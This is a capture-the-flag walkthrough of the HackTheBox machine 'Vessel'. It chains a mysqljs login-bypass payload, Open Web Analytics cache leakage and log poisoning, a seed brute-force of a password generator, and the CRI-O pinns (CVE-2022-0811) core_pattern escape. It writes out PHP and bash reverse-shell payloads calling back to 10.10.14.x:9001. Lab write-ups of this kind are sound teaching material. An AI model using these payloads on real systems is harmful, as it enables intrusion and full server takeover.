IP: 10.10.11.178
# Enumeration
## Nmap
```bash
nmap 10.10.11.178 -sC -sV -oA nmap/Vessel
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Vessel
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The XML parsing error is new.

## Gobuster
```bash
gobuster -m dir -u http://10.10.11.178 -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -o root.gobuster -s 200,204,301,307
```

Finds a dev endpoint but it redirects to a 404.

Fuzzing the dev end point with a few word lists finds a `.git` directory.

## Git dump
You can dump the .git directory with git-dumper.
```bash
git-dumper http://10.10.11.178/dev gitdump/
```

# Code Analysis
In index.js there is a comment saying to upgrade mysqljs. Which has a sql injection. [POC link](https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4)

Which is also in the code.
```js
router.post('/api/login', function(req, res) {
	let username = req.body.username;
	let password = req.body.password;
	if (username && password) {
		connection.query('SELECT * FROM accounts WHERE username = ? AND password = ?', [username, password], function(error, results, fields) {
			if (error) throw error;
			if (results.length > 0) {
				req.session.loggedin = true;
				req.session.username = username;
				req.flash('success', 'Succesfully logged in!');
				res.redirect('/admin');
			} else {
				req.flash('error', 'Wrong credentials! Try Again!');
				res.redirect('/login');
			}			
			res.end();
		});
	} else {
		res.redirect('/login');
	}
});
```

This can be done as the backend isnt checking the type of data being passed in so you can change it to be an object.

## POC
By changing the POST req you can get a 502 proxy error
```python
username=a&password[$ne]=a
```

Changing this to be:
```python
username=admin&password[password]=1
```

Bypasses the login and redirects to admin. It's best to convert this to json as nginx wont pass this.

```json
Content-Type: application/json # change the header to include this

{
	"username":"admin",
	"password":{
		"password":1
	}
}
```

This works as the SQL query will be
```
SELECT * FROM accounts WHERE username = admin AND password = password = 1; 
```

where 1 will be a bool. So the password check is now converted to `password=password=true` which is true.

# Open Web Analytics
There is a analytics page going to:
```
openwebanalytics.vessel.htb
```

This is version 1.7.3 which has an RCE (Going to use the original blog post and not the auto exploit scripts.) [link](https://devel0pment.de/?p=2494)
```txt
After calculating the filename, we can easily retrieve the cache file:

user@b0x:~$ curl http://localhost/owa_web/owa-data/caches/1/owa_user/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.php
```

Which means source code analysis.

## Code analysis (again)
So the path will be
```php
$cache_file = $collection_dir.$id.'.php';
```
where id is a md5 hash

Looking around a bit further the id is set to the user_id value. Trying the md5 sum of user_id1 works!

Decoding the base64 then using php to unserialise gives a lot of data:
```
temp_passkey: 4d796bdd52b49d489aa057d94422a9d9
api_key: a390cc0247ecada9a2b8d2338b9ca6d2
```

Reading further on the blog post you can use the temp key to reset a users password.

## Python script
Something new I'm going to try is to make a 'auto pwn' python script for footholds where possible. 

## Log poisoning
Again in the post you can just add in the log level for the server in the POST req to update the config file on the admin panel. Adding this
```
owa_config[base.error_log_level]=2&owa_config[base.error_log_file]=/var/www/html/owa/owa-data/logs/shell.php&
```

Then the payload:
```
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.14/9001 0>&1"); ?>
```

This gives a reverse shell.

# Foothold as www-data
There is a passwordGenerator PE32 file.

Looking at the strings output there is reference to python, so it is probs python source code.

Extracting with pyinstxtractor.py shows it was built with python3.7.

## Docker Time
Installing python3.7 inside docker cause removing python likes to break my box. :)

Getting the docker file [link](https://raw.githubusercontent.com/docker-library/python/8a8d6baac38dcd208f699ae2eb10f0893a764035/3.7/alpine3.17/Dockerfile) then building with docker: `sudo docker build .`

Inside the container get uncompyle using pip, then decompile the passwordgenerator.pyc file.
```bash
uncompyle6 passwordGenerator.pyc > passwordGenerator.py
```

Looking at how the password is generated the time is the seed.
```python
length = 32
charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&*()_-+={}[]|:;<>,.?'
qsrand(QTime.currentTime().msec())
password = ''
for i in range(length):
    idx = qrand() % len(charset)
    nchar = charset[idx]
    password += str(nchar)
```

Which means there are only 1k possible passwords.
```python
from PySide2.QtCore import *
length = 32
charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&*()_-+={}[]|:;<>,.?'
for i in range(0,999):
    qsrand(i)
    password = ''
    for i in range(length):
        idx = qrand() % len(charset)
        nchar = charset[idx]
        password += str(nchar)
    print(password)
```

## PDF
There is a pdf in stevens directory that needs a password. So going to brute force it with the list made above.

Hash:
```
notes.pdf:$pdf$2*3*128*-1028*1*16*c19b3bb1183870f00d63a766a1f80e68*32*4d57d29e7e0c562c9c6fa56491c4131900000000000000000000000000000000*32*cf30caf66ccc3eabfaf371623215bb8f004d7b8581d68691ca7b800345bc9a86
```

Password:
It didn't crack?

This could be due to the fact that linux and windows will generate different random seeds.

Rerunning the file on windows does generate a different list.

Hash now cracks to:
```
YG7Q7RDzA+q&ke~MJ8!yRzoI^VQxSqSS
```

The note gives ethan's password:
```
b@mPRNSVTjjLKId1T
```

user.txt:
```
fb528f735a118d3b713ca8aa5120319d
```

# Ethan User
SetUID's
```
find / -perm -4000 -ls 2>/dev/null
```

There is a pinns binary.

googling finds an exploit, [link](https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/)
```bash
 cat ./sysctl-set.yaml
apiVersion: v1
kind: Pod
metadata:
  name: sysctl-set
spec:
  securityContext:
   sysctls:
   - name: kernel.shm_rmid_forced
     value: "1+kernel.core_pattern=|/var/lib/containers/storage/overlay/3ef1281bce79865599f673b476957be73f994d17c15109d2b6a426711cf753e6/diff/malicious.sh #"
  containers:
  - name: alpine
    image: alpine:latest
    command: ["tail", "-f", "/dev/null"]
```
You can change the core pattern which will allow you to run a script when a core dump happens.

## Pinns source code
More source code.
```js
{"help", no_argument, NULL, 'h'},
{"uts", optional_argument, NULL, 'u'},
{"ipc", optional_argument, NULL, 'i'},
{"net", optional_argument, NULL, 'n'},
{"user", optional_argument, NULL, 'U'},
{"cgroup", optional_argument, NULL, 'c'},
{"mnt", optional_argument, NULL, 'm'},
{"dir", required_argument, NULL, 'd'},
{"filename", required_argument, NULL, 'f'},
{"uid-mapping", optional_argument, NULL, UID_MAPPING},
{"gid-mapping", optional_argument, NULL, GID_MAPPING},
{"sysctl", optional_argument, NULL, 's'},
```

```bash
pinns -s 'kernel.shm_rmid_forced=1+kernel.core_pattern=|/tmp/exploit.sh' -d /dev/shm/ -f out  -U
```

This will set the core dump. Now to make the exp script.
```
#!/bin/bash
bash -i /dev/tcp/10.10.14.15/9001 0>&1
```

Then to create a coredump
```
sleep 20 &
kill -3 <proc number>
```

Which gives a root shell!

root.txt
```
fd8ee9d5166387cb468ce17c7f7db810
```

Fin